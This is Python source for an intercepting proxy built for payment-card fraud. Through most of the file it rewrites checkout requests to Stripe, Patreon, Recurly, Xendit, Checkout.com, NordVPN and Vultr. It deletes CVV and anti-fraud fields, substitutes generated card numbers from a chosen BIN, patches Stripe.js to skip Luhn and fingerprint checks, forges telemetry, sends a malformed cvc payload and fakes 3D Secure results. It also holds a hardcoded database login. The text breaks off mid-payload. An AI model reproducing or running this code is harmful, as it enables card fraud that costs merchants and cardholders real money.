import base64
import glob
import gzip
import http.client
import http.server
import random
import string
import importlib
import json
import os
import re
import select
import socket
import ssl
import base64
import requests
import sys
import datetime
import threading
import time
import urllib.parse
import zlib
from http.client import HTTPMessage
from http.server import BaseHTTPRequestHandler, HTTPServer
from socketserver import ThreadingMixIn
from subprocess import PIPE, Popen
import socketserver
import hashlib
import io
import brotli
import tempfile
from OpenSSL import crypto
import traceback
import logging
from cryptography import x509
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives.serialization import Encoding, PrivateFormat, NoEncryption
from cryptography.hazmat.backends import default_backend
from cryptography.x509.oid import NameOID
from pymongo import MongoClient

bin_whitelist = ["Oxxi1337", "Dons"]

logging.getLogger('http.server').setLevel(logging.CRITICAL + 1)

client = MongoClient('mongodb+srv://hitler-user:hitler2024@hitler.ak4oefw.mongodb.net/?retryWrites=true&w=majority&appName=Hitler')
userDatabase = client['mohiodb']['users']

def request_handler(req, req_body):
	if req.path.split("://", 1)[1].startswith("payments.vultr.com"):
		try:
			if b"cc_cscv" in req_body:
				req.addToLogs("yellow:yellow:[⚠️] Vultr Detected.")
				parsedbody = parse_x_www_form_urlencoded(req_body.decode("utf-8"))
				
				# Delete CVV
				parsedbody = deletefromarray(parsedbody, "cc_cscv")
				
				if parsedbody["cc_number"].replace(" ", "").startswith("409595") and not req.getCurrentUser().get("username") in bin_whitelist:
					parsedbody["cc_number"] = parsedbody["cc_number"].replace(" ", "").replace("cc_number", "")
				
				if not checkcc(req.getCurrentUser().get("settings").get("bin"), parsedbody["cc_number"].replace(" ", "")):
					gennedCC = gencc(req.getCurrentUser().get("settings").get("bin"))
					ccNumber = gennedCC[0]
					parsedbody["cc_number"] = ' '.join([ccNumber[i:i+4] for i in range(0, len(ccNumber), 4)])
					parsedbody["cc_mmyy"] = f"{gennedCC[1]} %2F {gennedCC[2]}"
					
				req.addToLogs("yellow:yellow:[⚠️] Trying Card: "+parsedbody["cc_number"].replace(" ", "")+"|"+parsedbody["cc_mmyy"].split(" %2F ")[0]+"|"+parsedbody["cc_mmyy"].split(" %2F ")[1])
				
				req_body = build_x_www_form_urlencoded(parsedbody).encode()
				req.addToLogs('green:lime:[✅] Bypass Vultr Success!')
		except Exception as e:
			traceback.print_exc()
			pass
	
	if req.path.split("://", 1)[1].startswith("iframe-api.nordpayments.com"):
		try:
			if b"cvc" in req_body:
				req.addToLogs("yellow:yellow:[⚠️] NordVPN Detected.")
				parsedbody = json.loads(req_body.decode('utf-8'))
				
				# Delete CVV
				parsedbody["cvc"] = ""
				
				if parsedbody["primary_account_number"].replace(" ", "").startswith("409595") and not req.getCurrentUser().get("username") in bin_whitelist:
					parsedbody["primary_account_number"].replace(" ", "").replace("409595", "")
				
				if not checkcc(req.getCurrentUser().get("settings").get("bin"), parsedbody["primary_account_number"].replace(" ", "")):
					gennedCC = gencc(req.getCurrentUser().get("settings").get("bin"))
					parsedbody["primary_account_number"] = gennedCC[0]
					parsedbody["expiration_month"] = gennedCC[1]
					parsedbody["expiration_year"] = "20" + gennedCC[2]
					
				req.addToLogs("yellow:yellow:[⚠️] Trying Card: "+parsedbody["primary_account_number"].replace(" ", "")+"|"+parsedbody["expiration_month"]+"|"+parsedbody["expiration_year"])
				
				req_body = json.dumps(parsedbody).encode()
				req.addToLogs('green:lime:[✅] Bypass NordVPN Success!')
		except Exception as e:
			traceback.print_exc()
			pass
	
	if req.path.split("://", 1)[1].startswith("api.xendit.co"):
		try:
			if b"card_cvn" in req_body:
				req.addToLogs("yellow:yellow:[⚠️] Xendit Detected.")
				parsedbody = json.loads(req_body.decode('utf-8'))
				
				# Delete CVV
				del parsedbody["card_cvn"]
				del parsedbody["card_data"]["cvn"]
				
				if parsedbody["card_data"]["account_number"].replace(" ", "").startswith("409595") and not req.getCurrentUser().get("username") in bin_whitelist:
					parsedbody["card_data"]["account_number"].replace(" ", "").replace("409595", "")
				
				if not checkcc(req.getCurrentUser().get("settings").get("bin"), parsedbody["card_data"]["account_number"].replace(" ", "")):
					gennedCC = gencc(req.getCurrentUser().get("settings").get("bin"))
					parsedbody["card_data"]["account_number"] = gennedCC[0]
					parsedbody["card_data"]["exp_month"] = gennedCC[1]
					parsedbody["card_data"]["exp_year"] = "20" + gennedCC[2]
					
				req.addToLogs("yellow:yellow:[⚠️] Trying Card: "+parsedbody["card_data"]["account_number"].replace(" ", "")+"|"+parsedbody["card_data"]["exp_month"]+"|"+parsedbody["card_data"]["exp_year"])
				
				req_body = json.dumps(parsedbody).encode()
				req.addToLogs('green:lime:[✅] Bypass Xendit Success!')
		except Exception as e:
			traceback.print_exc()
			pass

	if req.path.split("://", 1)[1].startswith("api.checkout.com"):
		try:
			if b"cvv" in req_body:
				req.addToLogs("yellow:yellow:[⚠️] Checkout.com Detected.")
				parsedbody = json.loads(req_body.decode('utf-8'))
				
				# Delete CVV
				parsedbody = deletefromarray(parsedbody, "cvv")
				
				if parsedbody["number"].replace(" ", "").startswith("409595") and not req.getCurrentUser().get("username") in bin_whitelist:
					parsedbody["number"] = parsedbody["number"].replace(" ", "").replace("409595", "")
				
				if not checkcc(req.getCurrentUser().get("settings").get("bin"), parsedbody["number"].replace(" ", "")):
					gennedCC = gencc(req.getCurrentUser().get("settings").get("bin"))
					parsedbody["number"] = gennedCC[0]
					parsedbody["expiry_month"] = gennedCC[1]
					parsedbody["expiry_year"] = gennedCC[2]
					
				req.addToLogs("yellow:yellow:[⚠️] Trying Card: "+parsedbody["number"].replace(" ", "")+"|"+parsedbody["expiry_month"]+"|"+parsedbody["expiry_year"])
				
				req_body = json.dumps(parsedbody).encode()
				req.addToLogs('green:lime:[✅] Bypass Checkout.com Success!')
		except Exception as e:
			traceback.print_exc()
			pass

	if req.path.split("://", 1)[1].startswith("www.patreon.com/api/checkout-intents/") or req.path.split("://", 1)[1].startswith("www.patreon.com/api/payment")  or req.path.split("://", 1)[1].startswith("htp.tokenex.com/iframe/"):
		try:
			gennedCC = gencc(req.getCurrentUser().get("settings").get("bin"))
			if b"CvvOnly" in req_body:
				parsedbody = json.loads(req_body.decode('utf-8'))
				
				ccNumber = gennedCC[0]
				
				if parsedbody["Data"].replace(" ", "").startswith("409595") and not req.getCurrentUser().get("username") in bin_whitelist:
					parsedbody["Data"] = parsedbody["Data"].replace(" ", "").replace("409595", "")
				
				if not checkcc(req.getCurrentUser().get("settings").get("bin"), parsedbody["Data"].replace(" ", "")):
					parsedbody['Data'] = ' '.join([ccNumber[i:i+4] for i in range(0, len(ccNumber), 4)])
				
				req_body = json.dumps(parsedbody).encode()
			
			if b"exp_year" in req_body:
				req.addToLogs("yellow:yellow:[⚠️] Patreon Detected.")
				parsedbody = json.loads(req_body.decode('utf-8'))
				
				if b"new_payment_method" in req_body:
					del parsedbody['data']['attributes']['new_payment_method']['tokenex_data']['csc']
					
					parsedbody["data"]["attributes"]["new_payment_method"]["tokenex_data"]["exp_month"] = gennedCC[1]
					parsedbody["data"]["attributes"]["new_payment_method"]["tokenex_data"]["exp_year"] = gennedCC[2]
					
					req.addToLogs("yellow:yellow:[⚠️] Trying Card: "+parsedbody["data"]["attributes"]["new_payment_method"]["tokenex_data"]["token"].replace(" ", "")+"|"+parsedbody["data"]["attributes"]["new_payment_method"]["tokenex_data"]["exp_month"]+"|"+parsedbody["data"]["attributes"]["new_payment_method"]["tokenex_data"]["exp_year"])
					
					req_body = json.dumps(parsedbody).encode()
					req.addToLogs('green:lime:[✅] Bypass Patreon Success!')
				elif parsedbody["data"].get("tokenex_data"):
					del parsedbody['data']['tokenex_data']['csc']
					
					parsedbody["data"]["tokenex_data"]["exp_month"] = gennedCC[1]
					parsedbody["data"]["tokenex_data"]["exp_year"] = gennedCC[2]
					
					req.addToLogs("yellow:yellow:[⚠️] Trying Card: "+parsedbody["data"]["tokenex_data"]["token"].replace(" ", "")+"|"+parsedbody["data"]["tokenex_data"]["exp_month"]+"|"+parsedbody["data"]["tokenex_data"]["exp_year"])
					
					req_body = json.dumps(parsedbody).encode()
					req.addToLogs('green:lime:[✅] Bypass Patreon Success!')
			else:
				print(req_body)
		except Exception as e:
			traceback.print_exc()
			pass
	
	if req.path.split("://", 1)[1].startswith("api.recurly.com"):
		try:
			if b"cvv" in req_body:
				req.addToLogs("yellow:yellow:[⚠️] Recurly Detected.")
				parsedbody = parse_x_www_form_urlencoded(req_body.decode("utf-8"))
				
				# Delete CVV
				parsedbody = deletefromarray(parsedbody, "cvv")
				
				if parsedbody["number"].replace(" ", "").startswith("409595") and not req.getCurrentUser().get("username") in bin_whitelist:
					parsedbody["number"] = parsedbody["number"].replace(" ", "").replace("409595", "")
				
				if not checkcc(req.getCurrentUser().get("settings").get("bin"), parsedbody["number"].replace(" ", "")):
					gennedCC = gencc(req.getCurrentUser().get("settings").get("bin"))
					parsedbody["number"] = gennedCC[0]
					parsedbody["month"] = gennedCC[1]
					parsedbody["year"] = gennedCC[2]
					
				req.addToLogs("yellow:yellow:[⚠️] Trying Card: "+parsedbody["number"].replace(" ", "")+"|"+parsedbody["month"]+"|"+parsedbody["year"])
				
				req_body = build_x_www_form_urlencoded(parsedbody).encode()
				req.addToLogs('green:lime:[✅] Bypass Recurly Success!')
		except Exception as e:
			traceback.print_exc()
			pass

	if req.path.split("://", 1)[1].startswith("api.stripe.com"):
		try:
			if b"payment_method_data[card][number]" in req_body:
				req.addToLogs("yellow:yellow:[⚠️] Stripe Detected.")
				parsedbody = parse_x_www_form_urlencoded(req_body.decode("utf-8"))

				#Delete CVV & Postal Code
				parsedbody = deletefromarray(parsedbody, "payment_method_data[card][cvc]")
				parsedbody = deletefromarray(parsedbody, "payment_method_data[billing_details][address][postal_code]")
				
				#Delete logging fields
				parsedbody = deletefromarray(parsedbody, "payment_method_data[pasted_fields]")
				parsedbody = deletefromarray(parsedbody, "payment_method_data[time_on_page]")
				parsedbody = deletefromarray(parsedbody, "payment_method_data[payment_user_agent]")

				if parsedbody["payment_method_data[card][number]"].replace(" ", "").startswith("409595") and not req.getCurrentUser().get("username") in bin_whitelist:
					parsedbody["payment_method_data[card][number]"] = parsedbody["payment_method_data[card][number]"].replace(" ", "").replace("409595", "")

				if not checkcc(req.getCurrentUser().get("settings").get("bin"), parsedbody["payment_method_data[card][number]"].replace(" ", "")):
					gennedCC = gencc(req.getCurrentUser().get("settings").get("bin"))
					parsedbody["payment_method_data[card][number]"] = gennedCC[0]
					parsedbody["payment_method_data[card][exp_month]"] = gennedCC[1]
					parsedbody["payment_method_data[card][exp_year]"] = gennedCC[2]

				req.addToLogs("yellow:yellow:[⚠️] Trying Card: "+parsedbody["payment_method_data[card][number]"].replace(" ", "")+"|"+parsedbody["payment_method_data[card][exp_month]"]+"|"+parsedbody["payment_method_data[card][exp_year]"])

				req_body = build_x_www_form_urlencoded(parsedbody).encode()
				req.addToLogs('green:lime:[✅] Bypass Stripe Success!')
			elif b"card[number]" in req_body:
				req.addToLogs("yellow:yellow:[⚠️] Stripe Detected.")
				parsedbody = parse_x_www_form_urlencoded(req_body.decode("utf-8"))

				#Delete CVV & Postal Code
				parsedbody = deletefromarray(parsedbody, "card[cvc]")
				parsedbody = deletefromarray(parsedbody, "billing_details[address][postal_code]")

				#Delete logging fields
				parsedbody = deletefromarray(parsedbody, "pasted_fields")
				parsedbody = deletefromarray(parsedbody, "time_on_page")
				parsedbody = deletefromarray(parsedbody, "payment_user_agent")

				if parsedbody["card[number]"].replace(" ", "").startswith("409595") and not req.getCurrentUser().get("username") in bin_whitelist:
					parsedbody["card[number]"] = parsedbody["card[number]"].replace(" ", "").replace("409595", "")

				if not checkcc(req.getCurrentUser().get("settings").get("bin"), parsedbody["card[number]"].replace(" ", "")):
					gennedCC = gencc(req.getCurrentUser().get("settings").get("bin"))
					parsedbody["card[number]"] = gennedCC[0]
					parsedbody["card[exp_month]"] = gennedCC[1]
					parsedbody["card[exp_year]"] = gennedCC[2]

				req.addToLogs("yellow:yellow:[⚠️] Trying Card: "+parsedbody["card[number]"].replace(" ", "")+"|"+parsedbody["card[exp_month]"]+"|"+parsedbody["card[exp_year]"])

				req_body = build_x_www_form_urlencoded(parsedbody).encode()
				req.addToLogs('green:lime:[✅] Bypass Stripe Success!')
			elif b"source_data[card][number]" in req_body:
				req.addToLogs("yellow:yellow:[⚠️] Stripe Detected.")
				parsedbody = parse_x_www_form_urlencoded(req_body.decode("utf-8"))

				#Delete CVV & Postal Code
				parsedbody = deletefromarray(parsedbody, "source_data[card][cvc]")
				parsedbody = deletefromarray(parsedbody, "source_data[billing_details][address][postal_code]")

				#Delete logging fields
				parsedbody = deletefromarray(parsedbody, "source_data[pasted_fields]")
				parsedbody = deletefromarray(parsedbody, "source_data[time_on_page]")
				parsedbody = deletefromarray(parsedbody, "source_data[payment_user_agent]")

				if parsedbody["source_data[card][number]"].replace(" ", "").startswith("409595") and not req.getCurrentUser().get("username") in bin_whitelist:
					parsedbody["source_data[card][number]"] = parsedbody["source_data[card][number]"].replace(" ", "").replace("409595", "")

				if not checkcc(req.getCurrentUser().get("settings").get("bin"), parsedbody["source_data[card][number]"].replace(" ", "")):
					gennedCC = gencc(req.getCurrentUser().get("settings").get("bin"))
					parsedbody["source_data[card][number]"] = gennedCC[0]
					parsedbody["source_data[card][exp_month]"] = gennedCC[1]
					parsedbody["source_data[card][exp_year]"] = gennedCC[2]

				req.addToLogs("yellow:yellow:[⚠️] Trying Card: "+parsedbody["source_data[card][number]"].replace(" ", "")+"|"+parsedbody["source_data[card][exp_month]"]+"|"+parsedbody["source_data[card][exp_year]"])

				req_body = build_x_www_form_urlencoded(parsedbody).encode()
				req.addToLogs('green:lime:[✅] Bypass Stripe Success!')
		except Exception as e:
			traceback.print_exc()
			pass
	
	try:
		if req.path.split("://", 1)[1].startswith("m.stripe.com") and False:
			old_req = req_body
			payload = json.loads(urllib.parse.unquote_plus(base64.b64decode(req_body).decode()))

			if payload.get("h", False) != False:
				start_time = random.randint(5000, 20000)

				payload["t"] = start_time
				payload["a"] = {
					"a": {
						"v": "true", #Don't know, probably always true
						"t": random.randint(1,9)/10
					},
					"b": {
						"v": "false", #Don't know, probably always false
						"t": random.randint(1,9)/10
					},
					"c": {
						"v": "en-US", #Browser language
						"t": random.randint(1,9)/10
					},
					"d": {
						"v": "Win32", #OS Version
						"t": random.randint(1,9)/10
					},
					"e": {
						"v": "PDF Viewer,internal-pdf-viewer", #Printer extensions
						"t": random.randint(1,9)/10
					},
					"f": {
						"v": "1920w_1040h_24d_1r", #Display settings
						"t": random.randint(1,9)/10
					},
					"g": {
						"v": "2", #Don't know, probably always 2
						"t": random.randint(1,9)/10
					},
					"h": {
						"v": "false", #Don't know, probably always false
						"t": random.randint(1,9)/10
					},
					"i": {
						"v": "sessionStorage-enabled, localStorage-enabled", #Get eyes
						"t": random.randint(50,100)/10
					},
					"j": {
						"v": "1111111111111111111111111111111111111111111111111111111", # What fonts you have, represented in 1s or 0s, it checks for these fonts: [["Andale Mono", "mono"], ["Arial Black", "sans"], ["Arial Hebrew", "sans"], ["Arial MT", "sans"], ["Arial Narrow", "sans"], ["Arial Rounded MT Bold", "sans"], ["Arial Unicode MS", "sans"], ["Arial", "sans"], ["Bitstream Vera Sans Mono", "mono"], ["Book Antiqua", "serif"], ["Bookman Old Style", "serif"], ["Calibri", "sans"], ["Cambria", "serif"], ["Century Gothic", "serif"], ["Century Schoolbook", "serif"], ["Century", "serif"], ["Comic Sans MS", "sans"], ["Comic Sans", "sans"], ["Consolas", "mono"], ["Courier New", "mono"], ["Courier", "mono"], ["Garamond", "serif"], ["Georgia", "serif"], ["Helvetica Neue", "sans"], ["Helvetica", "sans"], ["Impact", "sans"], ["Lucida Fax", "serif"], ["Lucida Handwriting", "script"], ["Lucida Sans Typewriter", "mono"], ["Lucida Sans Unicode", "sans"], ["Lucida Sans", "sans"], ["MS Gothic", "sans"], ["MS Outlook", "symbol"], ["MS PGothic", "sans"], ["MS Reference Sans Serif", "sans"], ["MS Serif", "serif"], ["MYRIAD PRO", "sans"], ["MYRIAD", "sans"], ["Microsoft Sans Serif", "sans"], ["Monaco", "sans"], ["Monotype Corsiva", "script"], ["Palatino Linotype", "serif"], ["Palatino", "serif"], ["Segoe Script", "script"], ["Segoe UI Semibold", "sans"], ["Segoe UI Symbol", "symbol"], ["Segoe UI", "sans"], ["Tahoma", "sans"], ["Times New Roman PS", "serif"], ["Times New Roman", "serif"], ["Times", "serif"], ["Trebuchet MS", "sans"], ["Verdana", "sans"], ["Wingdings 3", "symbol"], ["Wingdings", "symbol"]]
						"t": start_time-random.randint(50,200),
						"at": random.randint(15000,20000)/10
					},
					"k": {
						"v": "", #Don't know, its blank lol
						"t": random.randint(1,9)/10
					},
					"l": {
						"v": req.headers["User-Agent"], #Client's user agent
						"t": random.randint(1,9)/10
					},
					"m": {
						"v": "", #Don't know, its blank lol
						"t": random.randint(1,9)/10
					},
					"n": {
						"v": "false", #Don't know, probably always false
						"t": random.randint(15000,20000)/10
					},
					"o": {
						"v": hashlib.md5(os.urandom(128)).hexdigest(), #Canvas encoded to md5, who says it has to be a canvas tho :troll_face:
						"t": random.randint(1,9)/10
					},
				}

			req_body = base64.b64encode(urllib.parse.quote(json.dumps(payload, separators=(',', ':')), safe='').encode())
	except Exception as e:
		traceback.print_exc()

	return req_body

def response_handler(req, req_body, res, res_body):
	if req.path.split("://", 1)[1].startswith("htp.tokenex.com/iframe/"):
		# Fix 502 Bad Gateway on Tokenex
		res_body = requests.post(req.path, proxies=req.getFormattedProxy(), headers=req.headers, data=req_body).text.encode("utf-8")
		print(res_body)
	
	"""
	if req.path.split("://", 1)[1].startswith("api.stripe.com/v1/payment_intents/") and req.path.endswith("/confirm") or req.path.endswith("/verify_challenge"):
		# Fake success payment
		print("Confirm Detected.")
		error = json.loads(res_body.decode('utf-8'))
		print(error)
		if error.get("error"):
			if not error["error"]["type"] == "requires_action" and not error["error"]["type"] == "invalid_request_error" and error["error"]["payment_intent"].get("charges"):
				print("Ok #1")
				fakeBody = error["error"]["payment_intent"]
				fakeBody["amount_received"] = fakeBody["amount"]
				fakeBody["charges"]["data"][0]["balance_transaction"] = generateTxnId(fakeBody["charges"]["data"][0]["id"])
				fakeBody["charges"]["data"][0]["amount_captured"] = fakeBody["charges"]["data"][0]["amount"]
				fakeBody["charges"]["data"][0]["failure_code"] = None
				fakeBody["charges"]["data"][0]["failure_message"] = None
				fakeBody["charges"]["data"][0]["outcome"]["advice"] = None
				fakeBody["charges"]["data"][0]["outcome"]["network_advice_code"] = None
				fakeBody["charges"]["data"][0]["outcome"]["network_decline_code"] = None
				fakeBody["charges"]["data"][0]["outcome"]["network_status"] = "approved_by_network"
				fakeBody["charges"]["data"][0]["outcome"]["reason"] = None
				fakeBody["charges"]["data"][0]["outcome"]["risk_level"] = "normal"
				fakeBody["charges"]["data"][0]["outcome"]["seller_message"] = "Payment complete."
				fakeBody["charges"]["data"][0]["outcome"]["type"] = "authorized"
				fakeBody["charges"]["data"][0]["paid"] = True
				fakeBody["charges"]["data"][0]["status"] = "succeeded"
				fakeBody["last_payment_error"] = None
				fakeBody["status"] = "succeeded"
				res_body = json.dumps(fakeBody).encode("utf-8")
				print(res_body)
			else:
				print("Lmao")
		elif req.path.endswith("/verify_challenge"):
			fakeBody = error
			fakeBody["amount_received"] = fakeBody["amount"]
			fakeBody["last_payment_error"] = None
			fakeBody["status"] = "succeeded"
			res_body = json.dumps(fakeBody).encode("utf-8")
			print(res_body)
		else:
			print("No")
	"""
				
	if req.path.split("://", 1)[1].startswith("js.stripe.com"):
		# Luhn check bypass
		pattern = re.compile(b'return [a-zA-Z0-9]%10==0')
		res_body = pattern.sub(b'return true', res_body)
		res_body = res_body.replace(b'return u(r,i,n)', b'return null')

		stripejsuuid = b"//# sourceMappingURL=https://js.stripe.com/v3/sourcemaps/stripe-"
		if res_body.endswith(b".js.map") and stripejsuuid in res_body.split(b"\n", 1)[1]:
			#Fingerprint bypass
			res_body = res_body.replace(b"Mo:function(){return d},Ye:function(){return p}", b"Mo:function(){return false},Ye:function(){return false}")

			if isWin():
				sdf = open("static\\stripedetected.js", "rb")
			else:
				sdf = open("static/stripedetected.js", "rb")
			sd = sdf.read().replace(b"STRIPEVERSIONHERE", res_body.split(b",version:\"", 1)[1].split(b"\"", 1)[0])
			res_body = res_body+b"\r\n"+sd
			sdf.close()

	try:
		if req.path.split("://", 1)[1].startswith("api.stripe.com/v1/payment_pages/"):
			if b'"decline_code": "' in res_body:
				req.addToLogs("red:red:[❗] Failed Card: "+(res_body.decode("utf-8")).split('"decline_code": "')[1].split('"')[0])
			elif b'"code": "' in res_body:
				req.addToLogs("red:red:[❗] Failed Card: "+(res_body.decode("utf-8")).split('"code": "')[1].split('"')[0])
			elif b'"completed": true' in res_body:
				req.addToLogs('green:lime:[✅] Payment Success!')
			
		if req.path.split("://", 1)[1].startswith("api.stripe.com/v1/payment_intents/"):
			if b'"decline_code": "' in res_body:
				req.addToLogs("red:red:[❗] Failed Card: "+(res_body.decode("utf-8")).split('"decline_code": "')[1].split('"')[0])
			elif b'"code": "' in res_body:
				req.addToLogs("red:red:[❗] Failed Card: "+(res_body.decode("utf-8")).split('"code": "')[1].split('"')[0])
			elif b'succeeded' in res_body:
				req.addToLogs('green:lime:[✅] Payment Success!')
		
		if req.path.split("://", 1)[1].startswith("api.stripe.com/v1/checkout/sessions/completed_webhook_delivered/"):
			if b'"decline_code": "' in res_body:
				req.addToLogs("red:red:[❗] Failed Card: "+(res_body.decode("utf-8")).split('"decline_code": "')[1].split('"')[0])
			elif b'"code": "' in res_body:
				req.addToLogs("red:red:[❗] Failed Card: "+(res_body.decode("utf-8")).split('"code": "')[1].split('"')[0])
			elif b'"completed": true' in res_body:
				req.addToLogs('green:lime:[✅] Payment Success!')
	except Exception as e:
		traceback.print_exc()
		pass

	if req.path.split("://", 1)[1].startswith("api.stripe.com") and req.path.endswith("/v1/payment_methods"):
		try:
			parsedbody = parse_x_www_form_urlencoded(req_body.decode("utf-8"))
			if parsedbody["payment_user_agent"].endswith("checkout"):
				#Here we are using a checkout, time to do the funny

				parsedbody = deletefromarray(parsedbody, "card[cvc]")
				unexploited_payload = build_x_www_form_urlencoded(parsedbody)

				#Big meme right here LMFAO
				payload=unexploited_payload+"&card[cvc]=&card[cvc]=[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]"

				res_body = requests.post("https://api.stripe.com/v1/payment_methods", headers=req.headers, verify=True, proxies=req.getFormattedProxy(), data=payload).text.replace('{\n  "error": {\n    "type": "api_error",\n    "message" : "Sorry, something went wrong. We\'ve already been notified of the problem, but if you need any help, you can reach us at support.stripe.com/contact."\n  }\n}', '').encode()
		except Exception as e:
			print(e)

	if req.path.split("://", 1)[1].startswith("api.stripe.com") and req.path.endswith("/v1/3ds2/authenticate"):
		try:
			req_body = req_body.decode("utf-8")
			if "one_click_authn_device_support[hosted]" in req_body:
				# Here we have the authorization request, we are going to swap out the response with a success one

				challengeHeaders = req.headers
				del challengeHeaders["Content-Length"]

				challengeData = parse_x_www_form_urlencoded(req_body)
				del challengeData["one_click_authn_device_support[hosted]"]
				del challengeData["one_click_authn_device_support[same_origin_frame]"]
				del challengeData["one_click_authn_device_support[spc_eligible]"]
				del challengeData["one_click_authn_device_support[webauthn_eligible]"]
				del challengeData["one_click_authn_device_support[publickey_credentials_get_allowed]"]
				del challengeData["browser"]
				challengeData = build_x_www_form_urlencoded(challengeData)
				jresbody = json.loads(res_body.decode("utf-8"))

				payload = {
					"acsChallengeMandated": "N",
					"acsSignedContent": None,
					"acsTransID": jresbody["ares"]["acsTransID"],
					"acsURL": None,
					"authenticationType": None,
					"cardholderInfo": None,
					"messageExtension": [],
					"messageType": "ARes",
